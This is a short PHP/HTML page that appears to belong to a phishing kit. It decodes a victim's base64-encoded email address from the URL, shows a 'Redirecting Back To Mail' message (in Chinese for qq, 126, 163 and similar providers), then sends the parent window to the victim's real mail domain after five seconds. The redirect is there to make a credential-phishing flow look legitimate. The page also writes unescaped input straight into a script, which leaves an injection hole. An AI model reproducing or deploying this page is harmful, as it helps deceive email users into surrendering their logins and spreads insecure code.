<?php
$mail = $_GET['0'];
$dec = base64_decode($mail);
$domain = $dec;
$parts = explode("@",$domain);
$string = $parts['1'];
if (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false || stripos($domain, 'qq') !== false || stripos($domain, 'yeah') !== false || stripos($domain, '126') !== false || stripos($domain, '163') !== false){
$redirect = "重定向回邮件";
}

else{
$redirect = "Redirecting Back To Mail";
}
?><!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
<script>
setTimeout(function() {
    window.parent.window.location.href = "http://<?php echo $string; ?>";
}, 5000);
</script>
    <link rel="stylesheet" href="cache/loading.css">
  </head>
  <body>
  <center><p><?php echo $redirect; ?></p></center>
    <div class="loading">
	
      <div class="obj"></div>
      <div class="obj"></div>
      <div class="obj"></div>
      <div class="obj"></div>
      <div class="obj"></div>
      <div class="obj"></div>
      <div class="obj"></div>
      <div class="obj"></div>
    </div>
  </body>
</html>
